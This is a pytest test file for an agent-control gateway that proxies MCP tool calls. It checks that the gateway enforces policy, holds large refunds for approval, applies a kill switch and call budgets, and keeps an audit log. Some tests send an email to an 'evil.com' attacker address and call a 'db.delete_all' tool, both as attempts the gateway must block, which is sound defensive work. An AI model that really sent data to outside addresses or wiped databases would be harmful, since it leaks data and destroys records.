"""The gateway end to end: a forbidden call is blocked, an allowed
call reaches the tool server, and every call is in the audit log."""
from __future__ import annotations

import threading
import time

import pytest
import uvicorn
from fastapi.testclient import TestClient

from gateway.demo_server import create_demo_server
from gateway.proxy import Gateway, create_app

AGENT_KEY = "demo-key-support-bot"


@pytest.fixture(scope="module")
def upstream():
    thread = threading.Thread(
        target=uvicorn.run,
        args=(create_demo_server(),),
        kwargs={"host": "127.0.0.1", "port": 8001, "log_level": "error"},
        daemon=True)
    thread.start()
    time.sleep(1.0)
    yield "http://127.0.0.1:8001/mcp"


@pytest.fixture()
def gateway(tmp_path, upstream):
    return Gateway(policy_dir="policies",
                   keys={AGENT_KEY: "support-bot"},
                   upstream_url=upstream,
                   audit_path=tmp_path / "audit.jsonl",
                   data_dir=tmp_path / "data")


@pytest.fixture()
def client(gateway):
    return TestClient(create_app(gateway))


def _call(client, tool, args, key=AGENT_KEY):
    return client.post("/mcp", headers={"x-agent-key": key},
                       json={"jsonrpc": "2.0", "id": 1,
                             "method": "tools/call",
                             "params": {"name": tool,
                                        "arguments": args}})


def test_health(client):
    assert client.get("/health").json()["status"] == "ok"


def test_no_key_is_rejected(client):
    assert client.post("/mcp", json={"jsonrpc": "2.0", "id": 1,
                                     "method": "tools/list",
                                     "params": {}}).status_code == 401


def test_allowed_call_reaches_the_tool_server(client):
    resp = _call(client, "crm.read_customer",
                 {"customer_id": "cust_1", "limit": 5})
    assert resp.status_code == 200
    assert "Asha Sharma" in resp.json()["result"]["content"][0]["text"]


def test_forbidden_call_is_blocked(client):
    resp = _call(client, "email.send",
                 {"to": "attacker@evil.com", "subject": "x", "body": "y"})
    body = resp.json()
    assert "error" in body
    assert "blocked by Agent Gateway" in body["error"]["message"]


def test_allowed_email_goes_through(client):
    resp = _call(client, "email.send",
                 {"to": "team@company.com", "subject": "hi", "body": "yo"})
    assert "sent to team@company.com" in \
        resp.json()["result"]["content"][0]["text"]


def test_large_refund_is_held_for_approval(client):
    resp = _call(client, "refund.create",
                 {"customer_id": "cust_1", "amount": 150})
    result = resp.json()["result"]
    assert result["held_for_approval"] is True


def test_small_refund_goes_through(client):
    resp = _call(client, "refund.create",
                 {"customer_id": "cust_1", "amount": 50})
    assert "refund of 50" in \
        resp.json()["result"]["content"][0]["text"]


def test_unknown_tool_is_denied(client):
    resp = _call(client, "db.delete_all", {})
    assert "blocked by Agent Gateway" in resp.json()["error"]["message"]


def test_tools_list_is_filtered_by_policy(client):
    resp = client.post("/mcp", headers={"x-agent-key": AGENT_KEY},
                       json={"jsonrpc": "2.0", "id": 1,
                             "method": "tools/list", "params": {}})
    names = [t["name"] for t in resp.json()["result"]["tools"]]
    assert "db.delete_all" not in names
    assert "crm.read_customer" in names


def test_every_call_is_audited(client, gateway):
    _call(client, "crm.read_customer", {"customer_id": "cust_1"})
    _call(client, "email.send", {"to": "x@evil.com", "subject": "s",
                                 "body": "b"})
    _call(client, "refund.create", {"customer_id": "cust_1",
                                    "amount": 150})
    entries = gateway.audit.read()
    assert [e["decision"] for e in entries] == [
        "allow", "deny", "require_approval"]
    ok, _ = gateway.audit.verify()
    assert ok


def test_budget_denies_after_the_limit(client, gateway):
    gateway.policies["support-bot"].budgets = {"max_calls": 1}
    _call(client, "crm.read_customer", {"customer_id": "cust_1"})
    resp = _call(client, "crm.read_customer", {"customer_id": "cust_1"})
    assert "budget exhausted" in resp.json()["error"]["message"]


def test_kill_switch_stops_the_agent(client, gateway):
    gateway.kill("support-bot")
    resp = _call(client, "crm.read_customer", {"customer_id": "cust_1"})
    assert "kill switch" in resp.json()["error"]["message"]
    gateway.revive("support-bot")
    resp = _call(client, "crm.read_customer", {"customer_id": "cust_1"})
    assert "Asha Sharma" in resp.json()["result"]["content"][0]["text"]


def test_admin_audit_endpoints_need_the_admin_key(client, gateway):
    assert client.get("/admin/audit").status_code == 401
    gateway.admin_key = "admin-secret"
    headers = {"x-admin-key": "admin-secret"}
    assert client.get("/admin/audit", headers=headers).status_code == 200
    verify = client.get("/admin/audit/verify",
                        headers=headers).json()
    assert verify["ok"] is True
